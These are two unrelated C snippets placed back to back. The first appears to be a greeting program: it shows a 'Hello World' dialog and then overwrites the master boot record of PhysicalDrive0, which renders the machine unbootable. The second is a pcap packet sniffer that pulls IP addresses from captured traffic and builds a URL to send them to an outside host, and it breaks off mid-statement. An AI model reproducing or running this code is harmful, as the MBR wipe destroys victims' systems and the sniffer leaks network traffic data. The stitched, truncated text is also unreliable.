#include <stdio.h>
#include <Windows.h>

int main(int argc, char* argv[])
{
    // Display a dialog box
    MessageBox(NULL, "Hello World", "Dialog Box", MB_OK | MB_ICONINFORMATION);

    // Open the MBR
    HANDLE mbrHandle = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (mbrHandle == INVALID_HANDLE_VALUE)
    {
        printf("Error opening MBR: %d\n", GetLastError());
        return 1;
    }

    // Write "Hello World" to the MBR
    char buffer[512] = {0};
    for (int i = 0; i < 512; i++)
    {
        buffer[i] = "Hello World"[i % 11];
    }
    DWORD bytesWritten;
    if (!WriteFile(mbrHandle, buffer, 512, &bytesWritten, NULL))
    {
        printf("Error writing MBR: %d\n", GetLastError());
        CloseHandle(mbrHandle);
        return 1;
    }

    // Close the MBR
    CloseHandle(mbrHandle);

    return 0;
}







#include <stdio.h>
#include <pcap.h>
#include <curl/curl.h>

// Callback function that is called for each packet
void packet_handler(u_char* param, const struct pcap_pkthdr* header, const u_char* packet)
{
    // Extract the source and destination IP addresses from the packet
    char srcIp[16] = {0};
    char dstIp[16] = {0};
    sprintf(srcIp, "%d.%d.%d.%d", packet[26], packet[27], packet[28], packet[29]);
    sprintf(dstIp, "%d.%d.%d.%d", packet[30], packet[31], packet[32], packet[33]);

    // Create a URL with the source and destination IP addresses
    char url[256] = {0};
    sprintf(url, "http://example.com/update_network_map.php?src=%s&dst=%s", srcIp, dstIp

